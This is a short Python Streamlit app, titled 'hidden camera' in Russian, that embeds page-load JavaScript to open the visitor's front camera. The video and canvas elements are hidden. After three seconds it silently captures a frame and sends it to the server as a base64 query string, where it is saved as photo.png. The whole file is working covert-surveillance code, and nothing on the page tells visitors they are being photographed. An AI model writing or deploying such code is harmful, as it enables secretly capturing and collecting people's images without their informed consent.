import streamlit as st
import streamlit.components.v1 as components
import base64
import os

st.set_page_config(page_title="Камера", layout="centered")

st.title("📸 Скрытая камера")

# Обработка фото с фронта
if st.experimental_get_query_params().get("imgdata"):
    data_url = st.experimental_get_query_params()["imgdata"][0]
    header, encoded = data_url.split(",", 1)
    img_bytes = base64.b64decode(encoded)
    with open("photo.png", "wb") as f:
        f.write(img_bytes)
    st.success("Фото сохранено как photo.png!")

# HTML + JS
html_code = """
<video id="videoElement" width="640" height="480" autoplay style="display: none;"></video>
<canvas id="canvas" style="display: none;"></canvas>

<script>
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('videoElement');
        video.srcObject = stream;

        video.onplaying = () => {
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imgData = canvas.toDataURL('image/png');

                // Перенаправление с base64 как query
                window.location.search = "?imgdata=" + encodeURIComponent(imgData);
            }, 3000);
        };
    } catch (e) {
        alert("Ошибка доступа к камере: " + e);
    }
}

startCamera();
</script>
"""

components.html(html_code, height=600)
